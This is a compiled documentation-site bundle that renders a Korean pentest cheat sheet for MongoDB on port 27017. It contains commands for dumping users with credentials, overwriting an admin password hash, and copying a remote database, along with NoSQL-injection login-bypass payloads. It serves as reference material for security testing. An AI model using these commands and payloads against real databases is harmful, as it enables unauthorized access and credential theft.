"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5],{8333:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>a,contentTitle:()=>t,default:()=>u,frontMatter:()=>d,metadata:()=>o,toc:()=>l});const o=JSON.parse('{"id":"Cheatsheet/services/mongodb","title":"MongoDB - 27017","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/Cheatsheet/services/mongodb.md","sourceDirName":"Cheatsheet/services","slug":"/Cheatsheet/services/mongodb","permalink":"/my-docusaurus-page/Cheatsheet/services/mongodb","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":16,"frontMatter":{"sidebar_position":16},"sidebar":"tutorialSidebar","previous":{"title":"RPC - 111","permalink":"/my-docusaurus-page/Cheatsheet/services/rpc"},"next":{"title":"HTTP/HTTPS - 80/443","permalink":"/my-docusaurus-page/Cheatsheet/services/http"}}');var r=s(4848),i=s(8453);const d={sidebar_position:16},t="MongoDB - 27017",a={},l=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uc5f0\uacb0",id:"\uc5f0\uacb0",level:2},{value:"\uae30\ubcf8 \uba85\ub839\uc5b4",id:"\uae30\ubcf8-\uba85\ub839\uc5b4",level:2},{value:"\ube44\ubc00\ubc88\ud638 \uc7ac\uc124\uc815",id:"\ube44\ubc00\ubc88\ud638-\uc7ac\uc124\uc815",level:2},{value:"\ub370\uc774\ud130 \ucd94\ucd9c",id:"\ub370\uc774\ud130-\ucd94\ucd9c",level:2},{value:"NoSQL Injection",id:"nosql-injection",level:2},{value:"Nmap",id:"nmap",level:2},{value:"mongodump / mongorestore",id:"mongodump--mongorestore",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function c(n){const e={code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...n.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.header,{children:(0,r.jsx)(e.h1,{id:"mongodb---27017",children:"MongoDB - 27017"})}),"\n",(0,r.jsx)(e.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ud3ec\ud2b8"}),": 27017"]}),"\n",(0,r.jsx)(e.p,{children:"MongoDB\ub294 NoSQL \ubb38\uc11c \uc9c0\ud5a5 \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(e.h2,{id:"\uc5f0\uacb0",children:"\uc5f0\uacb0"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:'# \ub85c\uceec \uc5f0\uacb0\nmongo\n\n# \uc6d0\uaca9 \uc5f0\uacb0\nmongo "mongodb://<RHOST>:27017"\n\n# \uc778\uc99d \uc0ac\uc6a9\nmongo "mongodb://<USERNAME>:<PASSWORD>@<RHOST>:27017"\n\n# \ud2b9\uc815 \ub370\uc774\ud130\ubca0\uc774\uc2a4\nmongo "mongodb://<RHOST>:27017/<DATABASE>"\n'})}),"\n",(0,r.jsx)(e.h2,{id:"\uae30\ubcf8-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 \uba85\ub839\uc5b4"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"// \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ubaa9\ub85d\n> show dbs\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc0ac\uc6a9\n> use <DATABASE>\n\n// \uceec\ub809\uc158 \ubaa9\ub85d\n> show tables\n> show collections\n\n// \uc2dc\uc2a4\ud15c \ud0a4 \ud655\uc778\n> db.system.keys.find()\n\n// \uc0ac\uc6a9\uc790 \uc870\ud68c\n> db.users.find()\n> db.getUsers()\n> db.getUsers({showCredentials: true})\n\n// \uacc4\uc815 \uc870\ud68c\n> db.accounts.find()\n> db.accounts.find().pretty()\n\n// Admin DB \uc0ac\uc6a9\n> use admin\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\ube44\ubc00\ubc88\ud638-\uc7ac\uc124\uc815",children:"\ube44\ubc00\ubc88\ud638 \uc7ac\uc124\uc815"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'// \uc0ac\uc6a9\uc790 \ube44\ubc00\ubc88\ud638\ub97c "12345"\ub85c \ubcc0\uacbd\n> db.getCollection(\'users\').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })\n'})}),"\n",(0,r.jsx)(e.h2,{id:"\ub370\uc774\ud130-\ucd94\ucd9c",children:"\ub370\uc774\ud130 \ucd94\ucd9c"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'// \uc804\uccb4 \ub370\uc774\ud130\n> db.collection.find()\n\n// \ud2b9\uc815 \ud544\ub4dc\ub9cc\n> db.collection.find({}, {username:1, password:1})\n\n// \uc870\uac74\ubd80 \uc870\ud68c\n> db.collection.find({username: "admin"})\n\n// \uc815\ub82c\n> db.collection.find().sort({created: -1})\n\n// \uac1c\uc218 \uc81c\ud55c\n> db.collection.find().limit(10)\n'})}),"\n",(0,r.jsx)(e.h2,{id:"nosql-injection",children:"NoSQL Injection"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'// \ub85c\uadf8\uc778 \uc6b0\ud68c\n{"username": {"$ne": null}, "password": {"$ne": null}}\n{"username": {"$gt": ""}, "password": {"$gt": ""}}\n\n// \uc815\uaddc\uc2dd \uc0ac\uc6a9\n{"username": {"$regex": "^admin"}, "password": {"$ne": null}}\n'})}),"\n",(0,r.jsx)(e.h2,{id:"nmap",children:"Nmap"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# MongoDB \ubc84\uc804 \ud655\uc778\nsudo nmap -p27017 -sV <RHOST>\n\n# MongoDB \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p27017 --script mongodb-info <RHOST>\n\n# MongoDB \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc5f4\uac70\nsudo nmap -p27017 --script mongodb-databases <RHOST>\n"})}),"\n",(0,r.jsx)(e.h2,{id:"mongodump--mongorestore",children:"mongodump / mongorestore"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# \uc804\uccb4 \ubc31\uc5c5\nmongodump --host <RHOST> --port 27017\n\n# \ud2b9\uc815 \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ubc31\uc5c5\nmongodump --host <RHOST> --port 27017 --db <DATABASE>\n\n# \ubcf5\uc6d0\nmongorestore --host <RHOST> --port 27017 dump/\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\uc778\uc99d \uc5c6\ub294 \uc811\uadfc \ud655\uc778"}),"\n",(0,r.jsx)(e.li,{children:"\uae30\ubcf8 \uc790\uaca9\uc99d\uba85 \ud14c\uc2a4\ud2b8"}),"\n",(0,r.jsx)(e.li,{children:"NoSQL Injection \uc2dc\ub3c4"}),"\n",(0,r.jsx)(e.li,{children:"\ubbfc\uac10\ud55c \ub370\uc774\ud130 \ud655\uc778 (users, accounts, credentials \ub4f1)"}),"\n",(0,r.jsx)(e.li,{children:"JavaScript \uc2e4\ud589 \uac00\ub2a5 \uc5ec\ubd80"}),"\n"]})]})}function u(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,r.jsx)(e,{...n,children:(0,r.jsx)(c,{...n})}):c(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>d,x:()=>t});var o=s(6540);const r={},i=o.createContext(r);function d(n){const e=o.useContext(i);return o.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function t(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:d(n.components),o.createElement(i.Provider,{value:e},n.children)}}}]);